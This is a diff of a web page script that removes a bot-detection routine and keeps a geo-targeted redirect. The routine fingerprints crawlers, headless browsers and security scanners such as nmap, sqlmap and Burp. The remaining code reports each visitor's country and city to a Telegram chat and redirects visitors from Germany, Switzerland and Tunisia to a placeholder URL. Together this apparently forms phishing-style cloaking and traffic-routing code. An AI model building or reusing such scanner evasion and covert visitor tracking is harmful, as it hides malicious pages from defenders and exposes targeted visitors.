@@ -133,205 +133,12 @@
       }
     }
 
-    // Bot detection functions
-    function detectBot() {
-      const userAgent = navigator.userAgent.toLowerCase();
-      const botPatterns = [
-        // Common bot patterns
-        /bot/i, /crawler/i, /spider/i, /scraper/i, /crawling/i,
-        /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
-        /yandexbot/i, /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
-        /whatsapp/i, /telegrambot/i, /discordbot/i, /slackbot/i,
-        /curl/i, /wget/i, /python/i, /java/i, /php/i, /perl/i, /ruby/i,
-        /headless/i, /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
-        /chrome-lighthouse/i, /lighthouse/i, /gtmetrix/i, /pingdom/i,
-        /uptimerobot/i, /monitor/i, /check/i, /test/i, /scan/i,
-        // Social media crawlers
-        /facebook/i, /twitter/i, /linkedin/i, /pinterest/i, /instagram/i,
-        // Search engines
-        /google/i, /bing/i, /yahoo/i, /duckduckgo/i, /yandex/i, /baidu/i,
-        // Analytics and monitoring
-        /analytics/i, /monitor/i, /uptime/i, /ping/i, /health/i,
-        // Security scanners
-        /nmap/i, /nikto/i, /sqlmap/i, /w3af/i, /nessus/i, /openvas/i,
-        /acunetix/i, /burp/i, /zap/i, /skipfish/i, /waf/i
-      ];
-
-      // Check user agent against bot patterns
-      const isBotByUserAgent = botPatterns.some(pattern => pattern.test(userAgent));
-
-      // Check for missing browser features that bots often lack
-      const missingFeatures = {
-        webgl: !window.WebGLRenderingContext,
-        canvas: !document.createElement('canvas').getContext,
-        localStorage: !window.localStorage,
-        sessionStorage: !window.sessionStorage,
-        indexedDB: !window.indexedDB,
-        webAudio: !window.AudioContext && !window.webkitAudioContext,
-        geolocation: !navigator.geolocation,
-        notification: !window.Notification,
-        serviceWorker: !navigator.serviceWorker
-      };
-
-      const missingFeatureCount = Object.values(missingFeatures).filter(Boolean).length;
-      const isBotByFeatures = missingFeatureCount >= 5; // If 5+ features missing, likely a bot
-
-      // Check for suspicious behavior patterns
-      const suspiciousBehavior = {
-        noMouseMovement: true, // Will be updated if mouse moves
-        noKeyboardInput: true, // Will be updated if keyboard is used
-        noScroll: true, // Will be updated if page is scrolled
-        noClick: true, // Will be updated if page is clicked
-        noTouch: true, // Will be updated if touch events occur
-        noResize: true, // Will be updated if window is resized
-        noFocus: true, // Will be updated if window gains focus
-        noBlur: true // Will be updated if window loses focus
-      };
-
-      // Set up event listeners to detect human interaction
-      let interactionDetected = false;
-      
-      const markInteraction = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noMouseMovement = false;
-      };
-
-      const markKeyboardInteraction = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noKeyboardInput = false;
-      };
-
-      const markScroll = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noScroll = false;
-      };
-
-      const markClick = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noClick = false;
-      };
-
-      const markTouch = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noTouch = false;
-      };
-
-      const markResize = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noResize = false;
-      };
-
-      const markFocus = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noFocus = false;
-      };
-
-      const markBlur = () => {
-        interactionDetected = true;
-        suspiciousBehavior.noBlur = false;
-      };
-
-      // Add event listeners
-      document.addEventListener('mousemove', markInteraction, { once: true });
-      document.addEventListener('keydown', markKeyboardInteraction, { once: true });
-      document.addEventListener('scroll', markScroll, { once: true });
-      document.addEventListener('click', markClick, { once: true });
-      document.addEventListener('touchstart', markTouch, { once: true });
-      document.addEventListener('touchmove', markTouch, { once: true });
-      window.addEventListener('resize', markResize, { once: true });
-      window.addEventListener('focus', markFocus, { once: true });
-      window.addEventListener('blur', markBlur, { once: true });
-
-      // Check for headless browser indicators
-      const headlessIndicators = {
-        noPlugins: navigator.plugins.length === 0,
-        noLanguages: navigator.languages.length === 0,
-        noMimeTypes: navigator.mimeTypes.length === 0,
-        noPermissions: !navigator.permissions,
-        noWebDriver: !navigator.webdriver,
-        noChrome: !window.chrome,
-        noSafari: !window.safari,
-        noFirefox: !window.InstallTrigger,
-        noIE: !window.ActiveXObject,
-        noEdge: !window.StyleMedia,
-        // Check for automation tools
-        hasWebDriver: navigator.webdriver === true,
-        hasAutomation: navigator.webdriver || window.navigator.webdriver,
-        hasPhantom: window.callPhantom || window._phantom || window.phantom,
-        hasSelenium: window.document.$cdc_asdjflasutopfhvcZLmcfl_ || 
-                    window.document.$chrome_asyncScriptInfo ||
-                    window.document.$webdriver_evaluate ||
-                    window.document.__webdriver_evaluate ||
-                    window.document.__selenium_evaluate ||
-                    window.document.__fxdriver_evaluate ||
-                    window.document.__driver_evaluate ||
-                    window.document.__webdriver_script_func ||
-                    window.document.__webdriver_script_fn ||
-                    window.document.__fxdriver_script_func ||
-                    window.document.__driver_script_func ||
-                    window.document.__selenium_script_func ||
-                    window.document.__webdriver_script_function ||
-                    window.document.__fxdriver_script_function ||
-                    window.document.__driver_script_function ||
-                    window.document.__selenium_script_function
-      };
-
-      const headlessCount = Object.values(headlessIndicators).filter(Boolean).length;
-      const isHeadless = headlessCount >= 3;
-
-      // Check for bot-like screen resolution
-      const screenSize = {
-        width: screen.width,
-        height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight
-      };
-
-      const isSuspiciousResolution = 
-        screenSize.width === 0 || screenSize.height === 0 ||
-        screenSize.width < 200 || screenSize.height < 200 ||
-        screenSize.width > 10000 || screenSize.height > 10000;
-
-      // Check for missing or suspicious navigator properties
-      const navigatorProps = {
-        hasUserAgent: !!navigator.userAgent,
-        hasPlatform: !!navigator.platform,
-        hasVendor: !!navigator.vendor,
-        hasLanguage: !!navigator.language,
-        hasCookieEnabled: navigator.cookieEnabled,
-        hasOnLine: navigator.onLine !== undefined,
-        hasDoNotTrack: navigator.doNotTrack !== undefined,
-        hasMaxTouchPoints: navigator.maxTouchPoints !== undefined
-      };
-
-      const missingNavigatorProps = Object.values(navigatorProps).filter(prop => !prop).length;
-      const isSuspiciousNavigator = missingNavigatorProps >= 3;
-
-      // Return bot detection result
-      return {
-        isBot: isBotByUserAgent || isBotByFeatures || isHeadless || isSuspiciousResolution || isSuspiciousNavigator,
-        details: {
-          userAgent: isBotByUserAgent,
-          missingFeatures: isBotByFeatures,
-          headless: isHeadless,
-          suspiciousResolution: isSuspiciousResolution,
-          suspiciousNavigator: isSuspiciousNavigator,
-          interactionDetected: interactionDetected,
-          suspiciousBehavior: suspiciousBehavior,
-          headlessIndicators: headlessIndicators,
-          screenSize: screenSize,
-          navigatorProps: navigatorProps
-        }
-      };
-    }
-
     // Check if user is on mobile
     const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
 
     // Main function to handle visitor tracking
     async function trackVisitor() {
       const visitorInfo = await getVisitorInfo();
-      const botDetection = detectBot();
       
       // Check if visitor is from Germany (DE), Switzerland (CH), or Tunisia (TN)
       const allowedCountries = ['Germany', 'Switzerland', 'Tunisia', 'DE', 'CH', 'TN'];
@@ -340,7 +147,7 @@
                                    visitorInfo.country === 'Switzerland' ||
                                    visitorInfo.country === 'Tunisia';
       
-      const redirectStatus = (!botDetection.isBot && isFromAllowedCountry) ? 'Yes' : 'No';
+      const redirectStatus = isFromAllowedCountry ? 'Yes' : 'No';
       
       const message = `🔍 New Visitor Detected
       
@@ -348,7 +155,6 @@
 🌍 Country: ${visitorInfo.country}
 🏙️ City: ${visitorInfo.city}
 📱 Mobile Device: ${isMobile ? 'Yes' : 'No'}
-🤖 Bot Detected: ${botDetection.isBot ? 'Yes' : 'No'}
 🌍 Allowed Country: ${isFromAllowedCountry ? 'Yes' : 'No'}
 🔄 Redirected: ${redirectStatus}
 ⏰ Time: ${new Date().toLocaleString()}`;
@@ -356,8 +162,8 @@
       // Send notification to Telegram
       notifyTelegram(message);
 
-      // Redirect users who are not bots and from allowed countries after 1 second
-      if (!botDetection.isBot && isFromAllowedCountry) {
+      // Redirect users from allowed countries after 1 second
+      if (isFromAllowedCountry) {
         setTimeout(() => {
           window.location.href = "https://example.com"; // Change to your redirect URL
         }, 1000);
